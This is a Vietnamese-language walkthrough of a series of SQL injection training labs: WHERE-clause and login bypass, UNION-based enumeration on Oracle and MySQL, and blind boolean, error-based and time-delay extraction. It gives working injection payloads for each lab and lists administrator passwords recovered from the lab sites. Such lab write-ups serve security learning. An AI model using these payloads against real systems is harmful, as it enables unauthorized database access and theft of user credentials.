## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
![Image](https://github.com/user-attachments/assets/9890f783-0e29-4a33-98af-dd3cbb9e49bb)

Yêu cầu của lab là thực hiện sqli để hiện ra sản phẩm bị ẩn với câu query:<br>

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Khi vào trang web ấn chọn loại hàng ta sẽ thấy như sau.

![image-1](https://gist.github.com/user-attachments/assets/42263577-6dc1-4437-a14a-4793c5b9981f)

Loại hàng mà ta chọn được đưa vào param ?category= tương ứng với câu query ở trên.<br>

Theo như logi câu query ở trên thì loại hàng đó phải được release thì mới hiện ra => có thể với category bị ẩn thì câu query sẽ như thế này.

`SELECT * FROM products WHERE category = 'hidden' AND released = 0`

Vậy thì ta sẽ làm cho vế đằng sau AND trở thành luôn đúng.

![image-2](https://gist.github.com/user-attachments/assets/a1ddb223-5959-4f5c-b0ed-6ad19cb5a6ec)

Sử dụng toán tử logic thì câu query sẽ trở thành.

`SELECT * FROM products WHERE category = '' or 1=1 -- - AND released = 0`

Lúc này ta sẽ escape được category và để cho một điều kiện logic luôn đúng thì từ đó nó sẽ trả về query cho tất cả các bảng và bỏ qua về từ AND đi.


## Lab: SQL injection vulnerability allowing login bypass

![image-3](https://gist.github.com/user-attachments/assets/be91311b-0f7a-4690-a32c-f8851fcd22ff)

Yêu cầu lần này là đăng nhập bằng user **administrator** thông qua sqli.

Lần này ta không được biết câu query nữa mà phải tự đoán, có thể có dạng như sau: <br>

`SELECT * FROM users WHERE username='halo' AND password='conmeo'`

Vẫn với ý tưởng trước đó ta sẽ cố đăng nhập bằng administrator và bỏ phần xử lý password ở phía sau.

Nên payload của ta sẽ như sau: `administrator' -- -`<br>
Lúc này câu query sẽ như sau: `SELECT * FROM users WHERE username='administrator'-- - AND password='conmeo'`

Phần sau admin sẽ bị bỏ qua
![image-4](https://gist.github.com/user-attachments/assets/09276578-d4d8-4b46-8ba9-86739319e864)


## Lab: SQL injection attack, querying the database type and version on Oracle

![image-5](https://gist.github.com/user-attachments/assets/4144f987-835b-4c06-9c1a-437178acbe20)

Bài này ta sẽ dùng union-based để tấn công sqli trên database oracle

![image-6](https://gist.github.com/user-attachments/assets/12f0ae76-813e-4afb-9a52-8da69fa035f3)

Tuy nhiên khi mình thử dùng hàm version của Oracle thì bị lỗi internal, dù vậy khi dựa vào đây ta cũng có thể biết được rằng dựa vào error này để biết câu query có hợp lệ hay không.<br>

![image-7](https://gist.github.com/user-attachments/assets/503a122b-9bb6-49e0-a7b4-7b1d5b7bfef0)

Sau khi hỏi chatGPT thì biết được rằng, trong Oracle ta không thể select một function như bên MySQL mà không có vế `from` được.<br>

Chẳng hạn như trong MySQL thì có thể viết: `SELECT version();`<br>

Tuy nhiên nếu làm tương tự trong Oracle thì không được: `SELECT v$version;`<br>

Từ đó bảng **DUAL** được tạo ra để giải quyết vấn về này, đọc thêm tại:
[Document Oracle](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Selecting-from-the-DUAL-Table.html), [Blog](https://www.oracletutorial.com/oracle-basics/oracle-dual-table/)

Quay trở lại theo như **UNION-based SQLi** thì đầu tiên ta phải xác định được số cột mà bảng trả về có thể là dùng **order by** hoặc cứ **select** dần cho đủ số cột như cách làm sau đây:

![image-8](https://gist.github.com/user-attachments/assets/cc1efa14-1f32-4e56-9362-5b762e316ebf)

Thử một cột **abc** thì chưa được, tuy nhiên sau khi thêm một cột nữa lại ok

![image-9](https://gist.github.com/user-attachments/assets/8b2f553f-a248-4dd4-aaf3-a6f53698bb8c)

Dựa vào đây ta biết được rằng kết quả query sẽ được in lên màn hình, có một số trường hợp nếu không thấy lỗi nữa mà vẫn không thấy có gì in ra thì ta nên check trong BurpSuite.

Với ý tưởng đó mình lại đi thử tấn công theo cách thông thường trong mysql như sau 

![image-10](https://gist.github.com/user-attachments/assets/20371248-102e-4f9c-9ba5-c940bb37bafa)

Thì vẫn không được, không biết rằng version của Oracle có khác gì của MySQL không mình tìm hiểu thử

![image-11](https://gist.github.com/user-attachments/assets/968164d9-404d-4cd1-af99-6d65742bbbd5)

Sau khi tìm hiểu thì version của Oracle nó giống như một table hơn

![image-12](https://gist.github.com/user-attachments/assets/9d2cd4fc-01ee-4a24-9760-5eea50486a99)

Đọc thêm [tại đây](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/V-VERSION.html) 


Dựa vào đó ta lại tiếp tục khai thác, dư kiện hiện tại như sau:
- Oracle dùng bảng **DUAL** như một dummy table để vế **FROM** không bị bỏ trống.
- v$version giống như một cái bảng hơn là hàm.
- Dùng thông tin từ cột **BANNER** để xem version của database.

Cuối cùng ta đã khai thác thành công


![image-13](https://gist.github.com/user-attachments/assets/7a92fb65-3658-4ae7-88fc-538dd4d8a719)

![image-14](https://gist.github.com/user-attachments/assets/c14a3f98-4b58-417c-a0e8-57c5c760d8e5)

![image-15](https://gist.github.com/user-attachments/assets/7264ad00-eda7-4cbd-8c75-f415772ac849)

Câu query của ta như sau:`'union select NULL,BANNER from v$version -- -`

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

![image-16](https://gist.github.com/user-attachments/assets/a4adc14a-1819-48d6-b452-053bcaedec64)

Yêu cầu của bài này y hệt bài ở trên tuy nhiên về MySQL thì mình quen hơn Oracle, vì vậy cũng như ý tưởng ở bài trên mình sẽ bắt đầu khai thác

![image-17](https://gist.github.com/user-attachments/assets/3270d2da-34d8-4d6d-b46a-0664c86aaf7e)

![image-19](https://gist.github.com/user-attachments/assets/de78c182-4555-48a8-ae4e-e9cf7c5c9507)

Ở bài này mình sẽ sử dụng order by để tìm số cột, chẳng hạn như thay số cột thành 3 thì sẽ bị lỗi

![image-18](https://gist.github.com/user-attachments/assets/fa2adc58-1a40-4326-9c34-810511cc8c70)

Tiếp đó là tìm version thôi

![image-21](https://gist.github.com/user-attachments/assets/a504ced0-40cf-4997-82bd-b8296863b708)

![image-20](https://gist.github.com/user-attachments/assets/c1cfcc0f-c3ce-4d8a-9f83-a8d5c1d5f703)

Về căn bản bài này khai thác bằng MySQL cần ít kiến thức hơn Oracle 

Payload: `' union select NULL,version() -- -`

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

![image-22](https://gist.github.com/user-attachments/assets/553e2c4f-3be9-4aed-9ca0-fdf803e1d17c)

Với UNION-based thì đầu tiên mình vẫn sẽ đi tìm số cột

![image-23](https://gist.github.com/user-attachments/assets/28da07fa-2373-4749-b1e7-e5eebf7aa749)

Payload:`' union select NULL,version() -- -`

Xác định được số cột là 2, tiếp đến là xác định các table có trong bảng và tìm table có dạng users

![image-24](https://gist.github.com/user-attachments/assets/cce2ab29-cb52-440f-b277-6742e3bf0999)

![image-25](https://gist.github.com/user-attachments/assets/4cc1b090-a74d-46e2-abed-0a6fce6c45f5)

Payload:`' union select NULL, table_name from information_schema.tables -- -`

Tiếp đó tìm lần lượt đến các cột trong bảng users

![image-26](https://gist.github.com/user-attachments/assets/3fb169a7-aa8d-4664-980c-7d628d1674a0)

Payload:`' union select NULL,column_name from information_schema.columns where table_name = 'users_pjzcyr' -- -`

Sau đó từ 2 cột này ta sẽ lấy thông tin của tất cả user có trong bảng

![image-27](https://gist.github.com/user-attachments/assets/aeceb599-59c9-41a4-9480-1c0f85d182c9)

Payload: `union select username_yvexiw, password_vgbnsx from users_pjzcyr -- -`


## Lab: SQL injection attack, listing the database contents on Oracle

Câu này tương tự câu trên chỉ đổi database thôi

Số cột vẫn là 2

![image-28](https://gist.github.com/user-attachments/assets/528144c5-b9ce-4456-9e57-cc3a5e373418)

Payload:`' order by 2 -- -`

Mình đã thử tìm tên table như cách dùng với MySQL tuy nhiên không thành công, sau đó mình đã tìm hiểu và biết được rằng **information_schema** trong Oracle không chứa table_name mà là bẳng ALL_TABLES, đọc thêm: [StackOverflow](https://stackoverflow.com/questions/55037468/oracle-equivalent-of-information-schema-tables), [Document](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)

![image-29](https://gist.github.com/user-attachments/assets/704c1cf3-8c50-473a-8325-986d15828b51)

![image-30](https://gist.github.com/user-attachments/assets/020baf9b-f092-41fc-9ed9-25c86946621c)

Payload:`'union select NULL, table_name from all_tables -- -`

Tìm ra table trong database tiếp theo tìm ra database và cột thôi

Không như MySQL Oracle không chứa **column_name** trong **information_schema** mà chứa trong **all_tab_columns**, đọc thêm: [StackOverflow](https://stackoverflow.com/questions/8739203/oracle-query-to-fetch-column-names), [Document](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html)

![image-32](https://gist.github.com/user-attachments/assets/37ac0c64-27c9-4d2c-8025-c79fff4a3c13)

![image-31](https://gist.github.com/user-attachments/assets/7fe1732e-bf64-428b-a64f-516ec110421b)

Payload:`' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'USERS_SUDJWQ' -- -`

![image-33](https://gist.github.com/user-attachments/assets/60efd9ee-808e-4048-9ca6-c6ec0e821251)

Payload:`'UNION SELECT USERNAME_DGFUYS,PASSWORD_BUIFQE FROM USERS_AKIBVQ -- -`

## Lab: Blind SQL injection with conditional responses

![image-34](https://gist.github.com/user-attachments/assets/6f0315b0-1c05-42af-b567-1962038acaa0)

Bài này thì SQL sẽ nằm trong trường cookie, nếu như có trả về gì đó thì trang sẽ hiện ra chữ Welcome Back.

![image-35](https://gist.github.com/user-attachments/assets/207e577b-e0a2-452e-81d3-dbfefa4d8d5c)

Nếu thay 1=2 thì sẽ không có

![image-36](https://gist.github.com/user-attachments/assets/79f4dea5-2de5-418b-b077-efea98517ff3)

Thì sau khi mình mò một hồi mình nhận ra rằng lí do tất cả nhưng câu query không hoạt động là do thiếu vế **AND** bởi vì **or 1=1** hay **or 1=2** sẽ luôn trả về 1 vế luôn đúng hoặc sai nên mới nhận được welcome.

Giả sử câu query luôn có giả trị trả về có nghĩa là nó luôn **true** 
Nên **true or 1=1** hay **true or 1=2** sẽ luôn trả về kết quả

Tuy nhiên nếu muốn kiểm tra tính đúng sai của giá trị thì ta nên dùng toán tử **AND**, bởi dù vế query trước có đúng đi chăng nữa mà vế **AND** bị sao sẽ trả về giá trị ta mong muốn


Bây giờ ta sẽ tiếp tục kiểm tra xem bẳng user có tồn tại hay không bằng 1 trick mình vừa tìm được để trả về kết quả đúng sai

Payload:`' and (select 'a' from users limit 1)='a' --` 

Payload có nghĩa là select kí tự a trong bảng user tuy nhiên đây chỉ là để kiểm tra xem bảng users có tồn tại hay không và so sánh với kí tự a để kiểm tra điều đó

![image-37](https://gist.github.com/user-attachments/assets/55be0385-ef12-48bd-b994-04588c11a905)

Đây là th sai nên không thấy welcome giờ sẽ thử th đúng

![image-38](https://gist.github.com/user-attachments/assets/6ed6787b-9832-42bc-955c-d228eeb1f0a1)

Bây giờ với ý tưởng như vậy ta sẽ tiếp tục tìm tài khoản admin và password

Payload: `' aNd (select 'a' from users WHERE username='administrator')='a'--`

Trường hợp có admin

![image-39](https://gist.github.com/user-attachments/assets/843d88c8-2f30-4e6e-beb3-dca57d4d9d30)

Sau khi xác định có bảng users và tài khoản admin, tiếp theo ta sẽ kiểm tra độ dài của password để tí nữa bruteforce

Payload:`' and (select 'a' from users where username='administrator' and LENGTH(password)<1)='a' --`

Trường hợp thử length pass lớn hơn 1, sau đó cứ bruteforce dấu = ta sẽ có pass length = 20

![image-40](https://gist.github.com/user-attachments/assets/3ffa8691-66bb-48b6-ad20-ff7614887768)

Tiếp theo ta sẽ bruteforce pass = intruder với payload

Payload:`' and (select SUBSTRING(password,1,1) from users where username='administrator')='a' --`

![image-41](https://gist.github.com/user-attachments/assets/e1454650-3286-47dd-81a8-05e3dede8cdb)

Vậy là ta đã biết kí tự đầu tiên của pass là chữ z 

Giải thích thêm hàm SUBSTRING là lấy trong password kí tự đầu tiên và độ dài là 1, tuyến tính như vậy sẽ full 

![image-42](https://gist.github.com/user-attachments/assets/829575e5-2bc5-4472-8251-484705328eee)

20 kí tự này sẽ là pass: **zjlf82gpvassmldrvwyq**

![image-43](https://gist.github.com/user-attachments/assets/fb6a32a1-a622-4ca2-95d3-d819f424cd8a)


## Lab: Blind SQL injection with conditional errors

![image-44](https://gist.github.com/user-attachments/assets/c060202a-f614-40df-994d-62f0102e04bb)

Lab này ta sẽ dựa theo error của web để nhận biết

![image-45](https://gist.github.com/user-attachments/assets/02e97fab-d5cf-40fd-b40f-d9c1a3bcbc34)

ta dễ dàng thấy được rằng khi có dấu nháy vào thì câu query sẽ không được hoàn chỉnh và bị lỗi, **tiếp theo mình sẽ không kéo xuống dưới để xem nữa mà dựa vào độ dài của response để biết là có lỗi hay không**

Sau đó mình thử cho thêm 1 cặp dấu nháy vào và thấy hết lỗi

![image-46](https://gist.github.com/user-attachments/assets/c46859d9-784d-4124-81de-afeabaa3b179)


Ý tưởng tiếp theo sẽ là thực hiện 1 câu query bên trong dấu ngoặc này để kiểm tra xem có lỗi hay không

Cùng với ý tưởng bài trên đây là payload kiểm tra nối câu query
Payload:`'||(SELECT '' FROM dual)||'`

Với payload này nếu thực hiện đúng xong thì dấu nháy sẽ được nối lại nếu sai thì sẽ bị lỗi nên để kiểm tra khá tốt

![image-47](https://gist.github.com/user-attachments/assets/1288b09c-19f1-4384-be3d-869197b97383)

Bây giờ với kiểu **select 'a'** như bài trên ta bắt đầu kiểm tra bảng và user có tồn tại hay không

Payload: `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

![image-48](https://gist.github.com/user-attachments/assets/f1a67767-698c-4256-9130-8761cc75ff89)

Phần **Rownum** sẽ giống như **Limit** bên SQL, thử th bảng không tồn tại thế nào

![image-49](https://gist.github.com/user-attachments/assets/4d977771-fa0b-44e1-a534-32bc7baf3879)

Tiếp theo sẽ thử đến user admin

Payload:`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![image-51](https://gist.github.com/user-attachments/assets/5d934a22-e1f7-481c-b859-2edec9efe67a)

Kiểm tra xem user admin có tồn tại hay không

**Tại sao lại if clause lại phải trả ra lỗi?** bởi vì bài này ta dựa vào errors của web để biết được một câu query có đúng hay không.

Tiếp theo sẽ tiếp tục kiểm tra độ dài của pass

Payload:`'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![image-52](https://gist.github.com/user-attachments/assets/e52e80e4-738a-4776-a9cb-bd574223cd3a)


Độ dài pass vẫn là 20 như bài trước 

Tiếp theo lại bruteforce pass 

Payload:`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![image-53](https://gist.github.com/user-attachments/assets/9f1a7e52-6ae8-48d8-a36d-9e42a58316a2)

Chữ cái đầu tiên là **x** tiếp tục bruteforce cho đủ

![image-54](https://gist.github.com/user-attachments/assets/5d88db70-12f5-4546-9abc-cc8f5f92729d)

![image-55](https://gist.github.com/user-attachments/assets/39b7293c-a529-48d2-a3cc-04805ba04bcb)

Password là 20 kí tự này: **xdnuq2j4hvstdtwhv6z6**

## Lab: Visible error-based SQL injection

![image-57](https://gist.github.com/user-attachments/assets/6eb1e909-084d-40c1-97dc-40f54077a0d6)

Ở lab này eror sẽ được throw thẳng ra từ web, nếu câu query sai

![image-56](https://gist.github.com/user-attachments/assets/8897b9c7-a111-4042-8b44-4322c372de4e)

Ta sẽ dùng **CAST** trong mysql để check error - CAST sẽ đổi giá trị trả về thành kiểu dữ liệu bất kì, ý tưởng là sẽ dùng cast để nó throw error ra khi kiểu dữ liệu không phù hợp

Payload:`' AND CAST((SELECT 1) AS int)--`

![image-58](https://gist.github.com/user-attachments/assets/fca339d1-0a19-4df2-811d-c31bdc284b7b)

Mình sẽ thử thêm 1 vào để nhầm lẫn input luôn là boolean

Payload:`' AND 1=CAST((SELECT 1) AS int)--`

Tiếp theo sẽ tìm user trong bảng users

Payload:`' AND 1=CAST((SELECT username from users) AS int)--`

Khi mình thử payload này thì thấy rằng nó bị lỗi độ dài

![image-59](https://gist.github.com/user-attachments/assets/4aa95570-0fa0-4c76-a327-eba8da607be3)

Phần int đã bị mất


![image-60](https://gist.github.com/user-attachments/assets/88b81f1a-2883-4b39-9ec4-beed989e2ef5)

Payload:`' AND 1=CAST((SELECT username from users limit 1) AS int)--`

Do câu query trả về không được quá 1 dòng nên mình đã limit lại

Làm tương tự lấy được pass

![image-61](https://gist.github.com/user-attachments/assets/d720de18-e88e-4248-b5af-60f4deae0f4d)


## Lab: Blind SQL injection with time delays and information retrieval

![image-62](https://gist.github.com/user-attachments/assets/60b687e0-833c-4b6d-9520-35af21971501)

Bài này ta sẽ dùng time delay để xác định đúng sai, về mặc ý tưởng ý hệt conditional responses chỉ khác về cách nhận biết 1 cái dùng thời gian 1 cái dùng sự thay đổi của trang.

![image-63](https://gist.github.com/user-attachments/assets/f81da95b-6fc1-484b-a424-c1de2e27da24)

Payload:`' || pg_sleep(3) -- -`

Về payload này đầu tiên ta sẽ thoát chuỗi query sau đó nối dài câu query bằng toán tử concat **||** và **sleep** tùy thuộc vào database mà sử dụng concat và sleep khác nhau, sau khi thực thi thì thấy response bị chậm 3s, thử với 5s

![image-64](https://gist.github.com/user-attachments/assets/0078012f-cfd0-40ef-9026-9b0767e2b20f)

Tiếp theo các bước vẫn như cũ tìm kiếm table, user, pass

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users) -- -`

Trường hợp có bảng users

![image-65](https://gist.github.com/user-attachments/assets/e1cfa48b-47f3-4f65-bc58-747882c2dc38)

Ta thử một bảng không có xem sao

![image-66](https://gist.github.com/user-attachments/assets/76259da7-eed9-4c05-a325-761901e7911b)

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator') -- -`

![image-67](https://gist.github.com/user-attachments/assets/548f2836-877c-499b-8524-3689e5609ddf)

Tìm độ dài pass

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND LENGTH(password)=20) -- -`

![image-68](https://gist.github.com/user-attachments/assets/e2222a73-ef82-4440-ae52-65ee4a2b3d8f)

Sau đó vẫn như các bài trên tìm password

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(password, 1, 1)='a') -- -`

![image-69](https://gist.github.com/user-attachments/assets/b3446134-1cc4-406d-9879-b35a8e6652be)

Chữ cái đầu là số 3, cứ vậy tiếp tục tìm các chữ cái còn lại

![image-70](https://gist.github.com/user-attachments/assets/50921af9-5cbe-4672-930d-8df0847d815b)


Password:**3qgwyp0g9bdncslnerut**

![image-71](https://gist.github.com/user-attachments/assets/d75f7545-72aa-4692-a40d-4d3ca5ee6858)
